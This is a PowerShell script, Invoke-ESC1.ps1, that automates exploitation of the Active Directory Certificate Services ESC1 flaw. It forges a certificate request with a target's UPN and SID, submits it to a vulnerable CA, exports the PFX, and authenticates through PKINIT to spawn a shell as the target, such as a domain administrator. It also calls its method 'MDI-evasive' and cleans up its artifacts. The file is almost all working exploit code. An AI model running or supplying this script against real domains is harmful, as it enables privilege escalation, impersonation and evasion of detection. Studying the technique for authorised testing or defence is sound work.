<#
.SYNOPSIS
    Automated ESC1 exploitation using only built-in Windows tools.

.DESCRIPTION
    Chains certreq + certutil + Invoke-RunAsWithCert to exploit AD CS ESC1
    from a domain-joined workstation without any offensive tooling.

    Flow:
      1. Generates SID extension hex (Strong Certificate Mapping bypass)
      2. Creates a certificate request INF with the target's UPN and SID
      3. Submits the request via certreq to the vulnerable CA
      4. Exports the issued certificate as PFX
      5. Authenticates via PKINIT using the Windows API (MDI-evasive)
      6. Spawns a new process running as the target user

.PARAMETER CA
    The CA config string in the format "CA_HOSTNAME\CA_NAME".
    Example: "ca01.corp.local\CORP-CA"

.PARAMETER Template
    The vulnerable ESC1 certificate template name.
    Example: "User"

.PARAMETER TargetUPN
    The UPN of the user to impersonate.
    Example: "administrator@corp.local"

.PARAMETER TargetSID
    The SID of the target user.
    Example: "S-1-5-21-1234567890-987654321-1122334455-500"

.PARAMETER Domain
    The Active Directory domain name.
    Example: "CORP.LOCAL"

.PARAMETER Command
    The command to execute in the new logon session.
    Default: "powershell.exe"

.PARAMETER OutputPath
    Directory for temporary files. Default: current directory.

.PARAMETER KeepFiles
    Do not delete temporary files (INF, REQ, CER, PFX) after completion.

.EXAMPLE
    .\Invoke-ESC1.ps1 -CA "ca01.corp.local\CORP-CA" -Template "User" `
        -TargetUPN "administrator@corp.local" `
        -TargetSID "S-1-5-21-1234567890-987654321-1122334455-500" `
        -Domain "CORP.LOCAL"

.EXAMPLE
    .\Invoke-ESC1.ps1 -CA "ca01.corp.local\CORP-CA" -Template "VulnTemplate" `
        -TargetUPN "administrator@corp.local" `
        -TargetSID "S-1-5-21-1234567890-987654321-1122334455-500" `
        -Domain "CORP.LOCAL" -Command "cmd.exe" -KeepFiles
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$CA,

    [Parameter(Mandatory = $true)]
    [string]$Template,

    [Parameter(Mandatory = $true)]
    [string]$TargetUPN,

    [Parameter(Mandatory = $true)]
    [string]$TargetSID,

    [Parameter(Mandatory = $true)]
    [string]$Domain,

    [Parameter()]
    [string]$Command = "powershell.exe",

    [Parameter()]
    [string]$OutputPath = (Get-Location).Path,

    [Parameter()]
    [switch]$KeepFiles
)

$ErrorActionPreference = "Stop"
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path

# Dot-source helper scripts
. "$scriptDir\Get-SidExtensionHex.ps1"
. "$scriptDir\Invoke-RunAsWithCert.ps1"

$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
$baseName = "esc1_$timestamp"
$infPath = Join-Path $OutputPath "$baseName.inf"
$reqPath = Join-Path $OutputPath "$baseName.req"
$cerPath = Join-Path $OutputPath "$baseName.cer"
$pfxPath = Join-Path $OutputPath "$baseName.pfx"

try {
    # Step 1: Generate SID extension hex
    Write-Host "`n[Step 1/6] Generating SID extension hex..." -ForegroundColor Cyan
    $sidHex = Get-SidExtensionHex -SidString $TargetSID

    # Step 2: Create INF file
    Write-Host "[Step 2/6] Creating certificate request INF..." -ForegroundColor Cyan

    # Remove spaces from template name for CertificateTemplate attribute
    $templateAttr = $Template -replace ' ', ''

    $infContent = @"
[Version]
Signature="`$Windows NT$"

[NewRequest]
Subject = "CN=$env:USERNAME"
KeySpec = 1
KeyLength = 2048
Exportable = TRUE
MachineKeySet = FALSE
ProviderName = "Microsoft Enhanced Cryptographic Provider v1.0"
ProviderType = 12
RequestType = PKCS10
KeyUsage = 0xa0

[EnhancedKeyUsageExtension]
OID=1.3.6.1.5.5.7.3.2

[Extensions]
2.5.29.17 = "{text}"
_continue_ = "upn=$TargetUPN"
1.3.6.1.4.1.311.25.2 = "{hex}$sidHex"
"@

    $infContent | Out-File -FilePath $infPath -Encoding ASCII
    Write-Host "    INF: $infPath" -ForegroundColor Gray

    # Step 3: Generate CSR
    Write-Host "[Step 3/6] Generating CSR with certreq..." -ForegroundColor Cyan
    $result = certreq -new $infPath $reqPath 2>&1
    if ($LASTEXITCODE -ne 0) {
        throw "certreq -new failed: $result"
    }
    Write-Host "    REQ: $reqPath" -ForegroundColor Gray

    # Step 4: Submit to CA
    Write-Host "[Step 4/6] Submitting CSR to CA: $CA (Template: $templateAttr) ..." -ForegroundColor Cyan
    $result = certreq -submit -attrib "CertificateTemplate:$templateAttr" -config $CA $reqPath $cerPath 2>&1
    if ($LASTEXITCODE -ne 0) {
        throw "certreq -submit failed: $result"
    }
    Write-Host "    CER: $cerPath" -ForegroundColor Gray

    # Step 5: Accept and export PFX
    Write-Host "[Step 5/6] Accepting certificate and exporting PFX..." -ForegroundColor Cyan

    # Snapshot cert store before accept so we can find the new one
    $beforeThumbprints = Get-ChildItem Cert:\CurrentUser\My | Select-Object -ExpandProperty Thumbprint

    $result = certreq -accept $cerPath 2>&1
    if ($LASTEXITCODE -ne 0) {
        throw "certreq -accept failed: $result"
    }

    # Find the newly added cert by comparing before/after
    $cert = Get-ChildItem Cert:\CurrentUser\My | Where-Object {
        $_.Thumbprint -notin $beforeThumbprints
    } | Select-Object -First 1

    if (-not $cert) {
        throw "Could not find the issued certificate in the store"
    }

    $certThumbprint = $cert.Thumbprint
    $result = certutil -p "" -exportPFX -user My $certThumbprint $pfxPath 2>&1
    if ($LASTEXITCODE -ne 0) {
        throw "certutil -exportPFX failed: $result"
    }
    Write-Host "    PFX: $pfxPath" -ForegroundColor Gray

    # Step 6: Authenticate via PKINIT
    Write-Host "[Step 6/6] Authenticating via PKINIT as $TargetUPN ..." -ForegroundColor Cyan
    Invoke-RunAsWithCert -Certificate $pfxPath -Domain $Domain -Command $Command

    Write-Host "`n[+] Done. A new $Command window should have opened running as $TargetUPN" -ForegroundColor Green
    Write-Host "[*] Verify with: dir \\<DC_FQDN>\C$" -ForegroundColor Yellow

} catch {
    Write-Host "`n[!] Error: $_" -ForegroundColor Red
    Write-Host "[!] Stack: $($_.ScriptStackTrace)" -ForegroundColor DarkRed
} finally {
    if (-not $KeepFiles) {
        Write-Host "`n[*] Cleaning up temporary files..." -ForegroundColor Gray
        @($infPath, $reqPath, $cerPath, $pfxPath) | ForEach-Object {
            if (Test-Path $_) {
                Remove-Item $_ -Force
                Write-Host "    Removed: $_" -ForegroundColor DarkGray
            }
        }
    } else {
        Write-Host "`n[*] KeepFiles specified - temporary files retained." -ForegroundColor Gray
    }

    # Clean up the specific cert from personal store
    if ($certThumbprint) {
        $certStorePath = 'Cert:\CurrentUser\My\' + $certThumbprint
        Remove-Item $certStorePath -Force -ErrorAction SilentlyContinue
    }
}
